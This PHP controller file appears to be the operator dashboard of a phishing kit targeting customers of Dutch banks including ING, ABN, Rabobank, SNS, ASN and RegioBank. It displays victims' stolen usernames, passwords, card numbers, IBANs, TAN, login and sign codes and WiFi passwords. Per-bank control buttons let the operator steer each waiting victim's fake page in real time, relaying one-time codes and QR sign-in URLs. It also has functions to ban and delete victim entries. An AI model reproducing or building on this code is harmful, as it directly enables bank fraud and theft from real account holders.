<?php

namespace App\Controllers\Users;

use \Core\View;
use \App\Models\Users\User;
use \App\Auth;

class Logs extends \Core\Controller 
{
    public function logsAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION['username']);
            if ($data) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                    $logs = User::getLogs($_SESSION['username']);
                    $this->showLogs($logs);
                } else {
                    View::render('Users/logs.php', [
                        'title' => 'Logs'
                    ]);
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect('/login');
        }
    }

    public function getOneAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION['username']);
            if ($data) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id'])) {
                    $log = User::getLog($_POST['id'], $_SESSION['username']);
                    $this->showLog($log);
                } else {
                    static::redirect('/logs');
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect('/login');
        }
    }

    public function deleteAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION['username']);
            if ($data) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id'])) {
                    $data = ['id' => $_POST['id']];

                    $errors = ['id' => ''];
    
                    if (empty($data['id'])) {
                        $errors['id'] = 'empty_id';
                    } 
                                        
                    if (empty($errors['id'])) {
                        $check = User::deleteLog($_SESSION['username'], $data['id']);
                        
                        if ($check) {
                            echo json_encode(['success' => 'true']);
                        } else {
                            echo json_encode(['fail' => 'request_failed']);
                        }
                    } else {
                        echo json_encode($errors);    
                    } 
                } else {
                    static::redirect('/login');
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect('/login');
        }
    }   
    
    public function deleteAllAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION['username']);
            if ($data) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                    $check = User::deleteLogs($_SESSION['username']);
                    
                    if ($check) {
                        echo json_encode(['success' => 'true']);
                    } else {
                        echo json_encode(['fail' => 'request_failed']);
                    }                    
                } else {
                    static::redirect('/login');
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect('/login');
        }
    }

    public function banAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION['username']);
            if ($data) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['id']) && isset($_POST['ip'])) {
                    $data = [
                        'id' => $_POST['id'],
                        'ip' => $_POST['ip']
                    ];

                    $errors = [
                        'id' => '',
                        'ip' => ''
                    ];
    
                    if (empty($data['id'])) {
                        $errors['id'] = 'empty_id';
                    } 

                    if (empty($data['ip'])) {
                        $errors['ip'] = 'empty_ip';
                    } 
                                        
                    if (empty($errors['id']) && empty($errors['ip'])) {
                        $check = User::banUser($data['id'], $data['ip']);
                        
                        if ($check) {
                            echo json_encode(['success' => 'true']);
                        } else {
                            echo json_encode(['fail' => 'request_failed']);
                        }
                    } else {
                        echo json_encode($errors);    
                    } 
                } else {
                    static::redirect('/login');
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect('/login');
        }
    }   

    private function showLogs($logs)
    {
        foreach ($logs as $log) {
            $new_date = (new \DateTime());
            $old_date = (new \DateTime($log['last_connected']));
        
            $diff = $new_date->getTimestamp() - $old_date->getTimestamp();

            $waiting = ' bg-darker';
            $bank = '';
            if ($log['waiting'] == 'true') {
                $waiting = ' bg-blink';
            } else if ($diff < 10) {
                $waiting = ' bg-success';
            }

            if (!empty($log['bank'])) {
                $bank = $log['bank'];
            }
            echo '<div class="col-sm-12 col-md-6 col-lg-4">';
            echo '<div class="card mb-4 bg-darker custom-card">';
            echo '<a href="#' . htmlspecialchars($log['username']) . htmlspecialchars($log['user_id']) . '" class="d-block card-header py-3 collapsed' . $waiting . '" data-toggle="collapse" role="button" aria-expanded="false" aria-controls="collapseCardExample" style="border-bottom-color: transparent;">';
            echo '<h6 class="m-0 font-weight-bold text-white"><img class="pr-3" width="40" src="/img/location.png">'. htmlspecialchars($log['ip']); 
            if (empty($bank)) {
                echo '</h6>';   
            } else {
                echo " - $bank</h6>";
            }
            echo '</a>';
            echo '<div class="collapse" id="' . htmlspecialchars($log['username']) . htmlspecialchars($log['user_id']) . '" style="">';
            echo '<div class="card-body">';
            echo '<div class="form-group row mb-0"><label class="col-sm-4 font-weight-bold mb-0">URL: </label><div class="col-sm-8 mb-2"><a class="text-danger" href="/pay/' . htmlspecialchars($log['url']) . '">/' . htmlspecialchars($log['url']) . '</a></div></div>';
            echo '<div class="form-group row mb-0"><label class="col-sm-4 font-weight-bold mb-0">User ID: </label><div class="col-sm-8 mb-2">' . htmlspecialchars($log['user_id']) . '</div></div>';
            echo '<div class="form-group row mb-0"><label class="col-sm-4 font-weight-bold mb-0">User Agent: </label><div class="col-sm-8 mb-2">' . htmlspecialchars($log['user_agent']) . '</div></div>';
            echo '<hr>';
            ?>
            <button class="btn btn-outline-primary btn-circle btn-sm" onclick="openUser('<?php echo htmlspecialchars($log['user_id']);?>')"><i class="fas fa-external-link-alt"></i></button>
            <button class="btn btn-outline-warning btn-circle btn-sm" onclick="banUser('<?php echo htmlspecialchars($log['user_id']);?>', '<?php echo htmlspecialchars($log['ip']);?>')"><i class="fas fa-ban"></i></button>
            <button class="btn btn-outline-danger btn-circle btn-sm" onclick="deleteLog('<?php echo htmlspecialchars($log['user_id']);?>')"><i class="fas fa-trash"></i></button>
            <?php
            echo '</div>';
            echo '</div>';
            echo '</div>';
            echo '</div>';
        }
    }

    private function showLog($log)
    {   
        $new_date = (new \DateTime());
        $old_date = (new \DateTime($log['last_connected']));
    
        $diff = $new_date->getTimestamp() - $old_date->getTimestamp();

        echo '<div class="row p-1">';
        if ($log['waiting'] === 'true') {
            echo '<div class="col-12">';
            echo '<div class="col-12 bg-blink rounded">';
            echo '<h1 class="text-white text-center p-4" id="alert" style="font-size: 2rem">Currently Waiting ...</h1>';
            echo '</div>';
        } else if ($diff > 10) {
            echo '<div class="col-12">';
            echo '<div class="col-12 bg-darker rounded">';
            echo '<h1 class="text-danger text-center p-4" id="alert" style="font-size: 2rem">Currently Offline</h1>';
            echo '</div>';
        } else {
            echo '<div class="col-12">';
            echo '<div class="col-12 bg-success rounded">';
            echo '<h1 class="text-white text-center p-4" id="alert" style="font-size: 2rem">Currently Online</h1>';
            echo '</div>';
        }
        echo '</div>';
        echo '</div>';

        echo '<div class="row p-1">';
        echo '<div class="col-lg-8 col-sm-12">';
        echo '<div class="col-12 p-4 bg-darker rounded">';
        echo '<h4 class="text-white">Data</h4>';
        echo '<hr class="my-4">';
        echo '<div class="bg-darkest p-4 rounded">';
        if ($log['bank'] == 'ING') {
            if (!empty($log['ing_user']) && !empty($log['ing_pass'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Username:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_user']) . '</i></p>';
                echo '</div>';
                echo '</div>';
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Password:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_pass']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['ing_exp']) && !empty($log['ing_number'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Expiration:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_exp']) . '</i></p>';
                echo '</div>';
                echo '</div>';
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Card Number:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_number']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['ing_tan'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Tan-code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_tan']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['ing_wifi']) && !empty($log['ing_wifi_pass']) && !empty($log['ing_wifi_pass_two'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">WiFi Name:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_wifi']) . '</i></p>';
                echo '</div>';
                echo '</div>';
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">WiFi Password:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['ing_wifi_pass']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if ($log['waiting'] == 'true') {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php echo htmlspecialchars($log['user_id']);?>', 'login')"><i class="fas fa-sign-in-alt"></i> Login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php echo htmlspecialchars($log['user_id']);?>', 'details')"><i class="fa fa-info-circle" aria-hidden="true"></i> Details</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php echo htmlspecialchars($log['user_id']);?>', 'confirm')"><i class="fa fa-check" aria-hidden="true"></i> Confirm</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php echo htmlspecialchars($log['user_id']);?>', 'tan')"><i class="fa fa-phone" aria-hidden="true"></i> Tan</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php echo htmlspecialchars($log['user_id']);?>', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setIng('<?php echo htmlspecialchars($log['user_id']);?>', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php
            }
        } else if ($log['bank'] == 'ABN') {
            if (!empty($log['abn_iban']) && !empty($log['abn_number'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">IBAN:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_iban']) . '</i></p>';
                echo '</div>';
                echo '</div>';
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Card Number:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_number']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['abn_identification'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Phone Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_identification']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['abn_respons_one'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Login Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_respons_one']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['abn_respons_two'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Sign Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_respons_two']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['abn_wifi']) && !empty($log['abn_wifi_pass']) && !empty($log['abn_wifi_pass_two'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">WiFi Name:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_wifi']) . '</i></p>';
                echo '</div>';
                echo '</div>';
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">WiFi Password:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['abn_wifi_pass']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if ($log['waiting'] == 'true') {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAbn('<?php echo htmlspecialchars($log['user_id']);?>', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> IBAN</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAbn('<?php echo htmlspecialchars($log['user_id']);?>', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Phone Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAbn('<?php echo htmlspecialchars($log['user_id']);?>', 'loginCode')"><i class="far fa-keyboard"></i> Login Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAbn('<?php echo htmlspecialchars($log['user_id']);?>', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setAbn('<?php echo htmlspecialchars($log['user_id']);?>', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAbn('<?php echo htmlspecialchars($log['user_id']);?>', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Sign Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control abn-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php
            }            
        } else if ($log['bank'] === 'SNS') {
            if (!empty($log['sns_number'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Diginumber:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['sns_number']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['sns_respons'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Login Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['sns_respons']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if ($log['waiting'] == 'true') {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setSns('<?php echo htmlspecialchars($log['user_id']);?>', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Digicode</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setSns('<?php echo htmlspecialchars($log['user_id']);?>', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setSns('<?php echo htmlspecialchars($log['user_id']);?>', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setSns('<?php echo htmlspecialchars($log['user_id']);?>', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control sns-sign input-dark mt-4 custom-input"  style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php
            }         
        } else if ($log['bank'] === 'ASN') {
            if (!empty($log['asn_number'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Diginumber:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['asn_number']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['asn_respons'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Login Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['asn_respons']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if ($log['waiting'] == 'true') {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAsn('<?php echo htmlspecialchars($log['user_id']);?>', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Digicode</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAsn('<?php echo htmlspecialchars($log['user_id']);?>', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setAsn('<?php echo htmlspecialchars($log['user_id']);?>', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAsn('<?php echo htmlspecialchars($log['user_id']);?>', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control asn-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php
            }    
        } else if ($log['bank'] === 'REGIO') {
            if (!empty($log['regio_number'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Diginumber:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['regio_number']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['regio_respons'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Login Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['regio_respons']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if ($log['waiting'] == 'true') {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRegio('<?php echo htmlspecialchars($log['user_id']);?>', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Digicode</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRegio('<?php echo htmlspecialchars($log['user_id']);?>', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setRegio('<?php echo htmlspecialchars($log['user_id']);?>', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRegio('<?php echo htmlspecialchars($log['user_id']);?>', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control regio-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php
            }    
        } else if ($log['bank'] === 'RABO') {
            if (!empty($log['rabo_iban'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">IBAN:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_iban']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['rabo_number'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Number:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_number']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['rabo_respons_one'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Login Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_respons_one']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['rabo_respons_two'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Sign Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_respons_two']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['rabo_identification'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Phone Code:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_identification']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if (!empty($log['rabo_wifi']) && !empty($log['rabo_wifi_pass']) && !empty($log['rabo_wifi_pass_two'])) {
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">WiFi Name:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_wifi']) . '</i></p>';
                echo '</div>';
                echo '</div>';
                echo '<div class="form-group row">';
                echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">WiFi Password:</label>';
                echo '<div class="col-sm-9">';
                echo '<p class="text-secondary"><i>' . htmlspecialchars($log['rabo_wifi_pass']) . '</i></p>';
                echo '</div>';
                echo '</div>';
            }
            if ($log['waiting'] == 'true') {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php echo htmlspecialchars($log['user_id']);?>', 'loginPage')"><i class="fas fa-sign-in-alt"></i> Login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php echo htmlspecialchars($log['user_id']);?>', 'verificationPage')"><i class="fa fa-phone" aria-hidden="true"></i> Phone Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php echo htmlspecialchars($log['user_id']);?>', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setRabo('<?php echo htmlspecialchars($log['user_id']);?>', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row" style="display: <?php echo (!empty($log['rabo_code_one'])) ? 'none' : '';?>;">         
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php echo htmlspecialchars($log['user_id']);?>', 'login')"><i class="far fa-keyboard"></i> Login Code</button>
                            </div>  
                            <div class="col-lg-9">
                                <input type="text" class="form-control rabo-login input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter an URL for your QR Code (Login Code)">
                            </div>
                        </div> 
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php echo htmlspecialchars($log['user_id']);?>', 'signPage')"><i class="fa fa-sign-language" aria-hidden="true"></i> Sign Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control rabo-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter an URL for your QR Code (Sign Code)">
                            </div>
                        </div>                       
                    </div>
                </div>
                <?php
            }   
        }
        if ($log['waiting'] === 'false') {
            echo '</div>';
            echo '</div>';
            echo '</div>';
        }
        echo '<div class="col-lg-4 col-sm-12">';
        echo '<div class="col-12 p-4 bg-darker custom-top-margin rounded" style="min-height: 173px;">';
        echo '<h5 class="text-white">Options</h5>';
        echo '<hr class="my-4">';
        ?>
        <button class="btn btn-sm btn-rounded btn-outline-warning" onclick="banUser('<?php echo htmlspecialchars($log['ip']);?>', '<?php echo $log['user_id'];?>')"><i class="fa fa-ban"></i> Ban</button>
        <button class="btn btn-sm btn-rounded btn-outline-danger" onclick="deleteLog('<?php echo htmlspecialchars($log['user_id']);?>')"><i class="fa fa-trash"></i> Delete</button>
        <?php
        echo '</div>';
        echo '</div>';
        echo '</div>';

        echo '<div class="row p-1 mt-3 mb-3">';
        echo '<div class="col-lg-8 col-sm-12">';
        echo '<div class="col-12 p-4 bg-darker rounded">';
        echo '<h4 class="text-white">Information</h4>';
        echo '<hr class="my-4">';
        echo '<div class="bg-darkest p-4 rounded">';
        echo '<div class="form-group row">';
        echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">User ID:</label>';
        echo '<div class="col-sm-9">';
        echo '<p class="text-secondary"><i>' . $log['user_id'] . '</i></p>';
        echo '</div>';
        echo '</div>';
        echo '<div class="form-group row">';
        echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">User Browser:</label>';
        echo '<div class="col-sm-9">';
        echo '<p class="text-secondary"><i>' . $log['user_agent'] . '</i></p>';
        echo '</div>';
        echo '</div>';
        echo '<div class="form-group row">';
        echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">User IP:</label>';
        echo '<div class="col-sm-9">';
        echo '<p class="text-secondary"><i>' . $log['ip'] . '</i></p>';
        echo '</div>';
        echo '</div>';
        if (!empty($log['bank'])) {
            echo '<div class="form-group row">';
            echo '<label for="id" class="text-secondary col-sm-3 font-weight-bold">Bank:</label>';
            echo '<div class="col-sm-9">';
            echo '<p class="text-secondary"><i>' . $log['bank'] . '</i></p>';
            echo '</div>';
            echo '</div>';
        }
        echo '</div>';
    }
}